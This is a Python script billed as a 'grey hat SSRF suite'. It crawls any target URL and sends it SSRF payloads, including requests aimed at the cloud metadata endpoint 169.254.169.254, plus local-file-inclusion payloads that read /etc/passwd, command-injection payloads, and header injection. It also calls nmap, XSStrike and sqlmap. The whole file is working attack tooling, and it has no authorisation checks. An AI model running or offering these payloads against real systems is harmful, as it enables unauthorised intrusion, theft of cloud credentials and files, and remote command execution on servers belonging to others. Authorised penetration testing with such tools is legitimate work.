import requests
import urllib.parse
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import subprocess
import os

# ================== 💀 LOGO ===================
def print_logo():
    logo = r"""
       _____ _______ ______  _____ _______ _____  ______ 
      / ____|__   __|  ____|/ ____|__   __|  __ \|  ____|
     | (___    | |  | |__  | |       | |  | |__) | |__   
      \___ \   | |  |  __| | |       | |  |  _  /|  __|  
      ____) |  | |  | |____| |____   | |  | | \ \| |____ 
     |_____/   |_|  |______|\_____|  |_|  |_|  \_\______|

              
              _______  _______  _______  _______  ______   
             (  ____ \(  ___  )(       )(  ____ \(  __  \  
             | (    \/| (   ) || () () || (    \/| (  \  ) 
             | |      | |   | || || || || (__    | |   ) | 
             | | ____ | |   | || |(_)| ||  __)   | |   | | 
             | | \_  )| |   | || |   | || (      | |   ) | 
             | (___) || (___) || )   ( || (____/\| (__/  ) 
             (_______)(_______)|/     \|(_______/(______/  

             💀 TOOLS BY EASTER — GREY HAT SSRF SUITE 💀
    """
    print(logo)

# ================ 🎯 CONFIG ====================
visited_urls = set()
ssrf_payloads = []
encoders = [
    lambda x: x,
    lambda x: urllib.parse.quote(x),
    lambda x: urllib.parse.quote_plus(x),
    lambda x: x.replace("http://", "http://0x7f.0x0.0x0/"),
    lambda x: x.replace("http://", "http://2130706433/")
]
headers_to_inject = ["X-Forwarded-For", "X-Real-IP", "Forwarded", "Host"]
output_file = "scan_results.txt"

save_to_file = input("📂 Do you want to save the results to scan_results.txt? (y/n): ").strip().lower() == 'y'

def log_result(text):
    if save_to_file:
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(text + "\n")
    else:
        print(text)

# ================ 🔍 FUNCTIONS ==================
def crawl_and_discover(target):
    print(f"[*] Crawling {target}...")
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            full_url = urljoin(target, link['href'])
            if full_url not in visited_urls:
                visited_urls.add(full_url)
                if '?' in full_url:
                    test_ssrf(full_url)
    except Exception as e:
        log_result(f"[!] Crawl error: {e}")

def test_ssrf(url):
    log_result(f"[+] Testing SSRF on {url}")
    parsed = urllib.parse.urlparse(url)
    query = dict(urllib.parse.parse_qsl(parsed.query))
    for key in query:
        for payload in ssrf_payloads:
            for encode in encoders:
                test_query = query.copy()
                test_query[key] = encode(payload)
                new_query = urllib.parse.urlencode(test_query)
                new_url = parsed._replace(query=new_query).geturl()
                try:
                    r = requests.get(new_url, timeout=5)
                    log_result(f"[SSRF TESTED] {new_url} => {r.status_code}")
                except:
                    continue

def test_headers(url):
    for payload in ssrf_payloads:
        for header in headers_to_inject:
            headers = {header: payload}
            try:
                r = requests.get(url, headers=headers, timeout=5)
                log_result(f"[HEADER TESTED] {url} with {header} => {r.status_code}")
            except:
                continue

def test_post(url):
    for payload in ssrf_payloads:
        data = {"url": payload}
        try:
            r = requests.post(url, data=data, timeout=5)
            log_result(f"[POST TESTED] {url} => {r.status_code}")
        except:
            continue

def test_lfi(url):
    lfi_payloads = ["../../../../etc/passwd", "../etc/passwd", "../../../boot.ini", "../../windows/win.ini"]
    parsed = urllib.parse.urlparse(url)
    query = dict(urllib.parse.parse_qsl(parsed.query))
    for key in query:
        for payload in lfi_payloads:
            test_query = query.copy()
            test_query[key] = payload
            new_query = urllib.parse.urlencode(test_query)
            new_url = parsed._replace(query=new_query).geturl()
            try:
                r = requests.get(new_url, timeout=5)
                if "root:x:" in r.text or "[boot loader]" in r.text:
                    log_result(f"[LFI FOUND] {new_url}")
                else:
                    log_result(f"[LFI TESTED] {new_url}")
            except:
                continue

def test_rce(url):
    rce_payloads = [";id", "|id", "&id", "`id`", "$(id)"]
    parsed = urllib.parse.urlparse(url)
    query = dict(urllib.parse.parse_qsl(parsed.query))
    for key in query:
        for payload in rce_payloads:
            test_query = query.copy()
            test_query[key] = payload
            new_query = urllib.parse.urlencode(test_query)
            new_url = parsed._replace(query=new_query).geturl()
            try:
                r = requests.get(new_url, timeout=5)
                if "uid=" in r.text:
                    log_result(f"[RCE FOUND] {new_url}")
                else:
                    log_result(f"[RCE TESTED] {new_url}")
            except:
                continue

def run_nmap(target):
    print(f"[NMAP] Scanning {target}...")
    try:
        subprocess.call(["nmap", "-sV", target])
    except FileNotFoundError:
        log_result("[ERROR] Nmap not found. Please install and add to PATH.")

def run_xssstrike(target):
    print(f"[XSS] Scanning {target} with XSStrike...")
    try:
        subprocess.call(["xsstrike", "-u", target])
    except FileNotFoundError:
        log_result("[ERROR] XSStrike not found. Please install and add to PATH.")

def run_sqlmap(target):
    print(f"[SQLi] Scanning {target} with SQLMap...")
    try:
        subprocess.call(["sqlmap", "-u", target, "--batch"])
    except FileNotFoundError:
        log_result("[ERROR] SQLMap not found. Please install and add to PATH.")

# ================= 🢨 MAIN ======================
if __name__ == "__main__":
    print_logo()

    use_custom = input("❓ Do you want to use a custom payload wordlist? (y/n): ").strip().lower()
    if use_custom == 'y':
        wordlist_path = input("🔧 Enter path to your SSRF payload wordlist: ")
        if os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                ssrf_payloads = [line.strip() for line in f if line.strip()]
        else:
            log_result("❌ Wordlist not found.")
            exit(1)
    else:
        log_result("[+] Using built-in advanced SSRF payloads.")
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://0x7f000001",
            "http://2130706433",
            "http://127.0.0.1:80",
            "http://127.1",
            "http://[::1]",
            "http://google.com@127.0.0.1",
            "http://127.0.0.1.nip.io"
        ]

    target = input("🔧 Enter target URL or IP: ")

    print("""
    Select Option:
    1. Crawl & SSRF Scan
    2. Header Injection Scan
    3. POST Parameter SSRF Scan
    4. Nmap Scan
    5. XSStrike XSS Scan
    6. SQLMap SQLi Scan
    7. LFI Scan
    8. RCE Scan
    9. Run All
    """)

    choice = input("Enter choice (1-9): ")
    options = {
        "1": crawl_and_discover,
        "2": test_headers,
        "3": test_post,
        "4": run_nmap,
        "5": run_xssstrike,
        "6": run_sqlmap,
        "7": test_lfi,
        "8": test_rce,
        "9": lambda url: [
            crawl_and_discover(url),
            test_headers(url),
            test_post(url),
            test_lfi(url),
            test_rce(url),
            run_nmap(url),
            run_xssstrike(url),
            run_sqlmap(url)
        ]
    }

    selected = options.get(choice)
    if selected:
        selected(target)
    else:
        log_result("❌ Invalid choice")

    log_result(f"\n✅ Scan complete.")
